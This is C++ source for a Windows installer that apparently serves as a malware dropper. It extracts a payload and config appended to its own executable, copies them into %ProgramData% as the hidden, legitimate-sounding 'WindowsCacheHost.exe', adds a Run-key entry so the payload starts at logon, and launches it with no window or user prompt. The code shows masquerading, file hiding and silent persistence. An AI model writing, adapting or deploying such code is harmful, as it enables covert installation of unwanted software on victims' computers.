#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <fstream>
#include <cstdint>
#include <cstring>
#include <iterator>

#pragma pack(push, 1)
struct Footer {
    char magic[8];
    uint64_t originalOffset;
    uint64_t originalLength;
    uint64_t agentOffset;
    uint64_t agentLength;
    uint64_t configOffset;
    uint64_t configLength;
    wchar_t originalName[260];
};
#pragma pack(pop)

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")

static std::wstring ModuleDir() {
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    PathRemoveFileSpecW(path);
    return path;
}

static std::wstring Join(const std::wstring& a, const std::wstring& b) {
    wchar_t out[MAX_PATH]{};
    wcscpy_s(out, a.c_str());
    PathAppendW(out, b.c_str());
    return out;
}

static bool Copy(const std::wstring& from, const std::wstring& to) {
    return CopyFileW(from.c_str(), to.c_str(), FALSE) != FALSE;
}

static bool ReadSelf(std::vector<uint8_t>& data) {
    wchar_t path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::ifstream in(path, std::ios::binary);
    if (!in.good()) return false;
    data.assign(std::istreambuf_iterator<char>(in), std::istreambuf_iterator<char>());
    return true;
}

static bool WriteBytes(const std::wstring& path, const std::vector<uint8_t>& data) {
    std::ofstream out(path, std::ios::binary | std::ios::trunc);
    if (!out.good()) return false;
    out.write(reinterpret_cast<const char*>(data.data()), (std::streamsize)data.size());
    return out.good();
}

static bool ExtractBundled(std::wstring& agentPath, std::wstring& configPath) {
    std::vector<uint8_t> file;
    if (!ReadSelf(file) || file.size() < sizeof(Footer)) return false;
    Footer footer{};
    std::memcpy(&footer, file.data() + file.size() - sizeof(Footer), sizeof(Footer));
    if (std::memcmp(footer.magic, "KLINF1\0", 7) != 0) return false;
    if (footer.agentOffset + footer.agentLength > file.size() ||
        footer.configOffset + footer.configLength > file.size()) return false;

    std::vector<uint8_t> agent(file.begin() + footer.agentOffset, file.begin() + footer.agentOffset + footer.agentLength);
    std::vector<uint8_t> config(file.begin() + footer.configOffset, file.begin() + footer.configOffset + footer.configLength);
    wchar_t temp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, temp);
    std::wstring dir = std::wstring(temp) + L"kl_setup_" + std::to_wstring(GetCurrentProcessId());
    CreateDirectoryW(dir.c_str(), nullptr);
    agentPath = Join(dir, L"WindowsCacheHost.exe");
    configPath = Join(dir, L"klive.config.json");
    return WriteBytes(agentPath, agent) && WriteBytes(configPath, config);
}

static int RunHidden(const std::wstring& exe, const std::wstring& args, DWORD timeoutMs) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::wstring command = L"\"" + exe + L"\" " + args;
    if (!CreateProcessW(nullptr, command.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return -1;
    DWORD wait = WaitForSingleObject(pi.hProcess, timeoutMs);
    DWORD code = (DWORD)-1;
    if (wait == WAIT_OBJECT_0) GetExitCodeProcess(pi.hProcess, &code);
    else TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)code;
}

static bool CreateLogonTask(const std::wstring& exe) {
    HKEY key = nullptr;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, nullptr, 0, KEY_SET_VALUE, nullptr, &key, nullptr) != ERROR_SUCCESS) return false;
    std::wstring value = L"\"" + exe + L"\" --installed";
    LONG result = RegSetValueExW(key, L"WindowsCacheHost", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(value.c_str()), (DWORD)((value.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(key);
    return result == ERROR_SUCCESS;
}

static bool StartAgent(const std::wstring& exe, const std::wstring& workingDir) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::wstring command = L"\"" + exe + L"\" --installed";
    bool ok = CreateProcessW(nullptr, command.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
        nullptr, workingDir.c_str(), &si, &pi) != FALSE;
    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ok;
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    std::wstring source = ModuleDir();
    std::wstring agentSource = Join(source, L"WindowsCacheHost.exe");
    std::wstring configSource = Join(source, L"klive.config.json");
    if (!PathFileExistsW(agentSource.c_str()) || !PathFileExistsW(configSource.c_str())) {
        if (!ExtractBundled(agentSource, configSource)) return 1;
    }

    wchar_t programData[MAX_PATH]{};
    if (!GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH))
        return 1;

    std::wstring targetDir = Join(programData, L"WindowsCacheHost");
    CreateDirectoryW(targetDir.c_str(), nullptr);
    std::wstring agentTarget = Join(targetDir, L"WindowsCacheHost.exe");
    std::wstring configTarget = Join(targetDir, L"klive.config.json");

    if (!Copy(agentSource, agentTarget) || !Copy(configSource, configTarget))
        return 1;

    SetFileAttributesW(agentTarget.c_str(), FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributesW(configTarget.c_str(), FILE_ATTRIBUTE_HIDDEN);

    CreateLogonTask(agentTarget);
    return StartAgent(agentTarget, targetDir) ? 0 : 1;
}

